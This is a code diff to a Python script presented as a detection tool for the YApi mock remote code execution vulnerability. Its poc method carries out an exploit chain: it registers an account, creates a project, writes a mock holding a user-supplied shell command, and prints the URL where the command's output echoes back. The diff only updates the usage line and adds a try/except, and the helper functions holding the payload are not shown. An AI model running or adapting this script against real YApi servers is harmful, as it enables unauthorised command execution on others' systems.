@@ -1,7 +1,7 @@
 '''
     Yapi mock 远程代码执行漏洞检测脚本。
                                         ——by jammny.
-    用法：python Yapi_Mock_Rce.py http://127.0.0.1 whoami
+    用法：python Yapi_Mock_Rce.py [ip] [cmd]
 '''
 
 import requests, sys, random, json
@@ -67,13 +67,16 @@ class Scan():
 
     def poc(self, cmd):
         print('[+] 正在检测YApi Mock远程代码执行漏洞...')
-        cookies = self.reg_email()
-        id = self.get_id(cookies)
-        _id = self.add_project(cookies, id)
-        self.write_mock(cookies, _id, cmd)
-        self.add_interface(cookies,_id)
-        url = self.host + '/mock/{}/rce/rce'.format(_id)
-        print('[+] 命令执行回显地址：{}'.format(url))
+        try:
+            cookies = self.reg_email()
+            id = self.get_id(cookies)
+            _id = self.add_project(cookies, id)
+            self.write_mock(cookies, _id, cmd)
+            self.add_interface(cookies,_id)
+            url = self.host + '/mock/{}/rce/rce'.format(_id)
+            print('[+] 命令执行回显地址：{}'.format(url))
+        except:
+            print('[-] 可能不存在Yapi Mock远程代码执行漏洞')
 
     def exp(self):
         pass
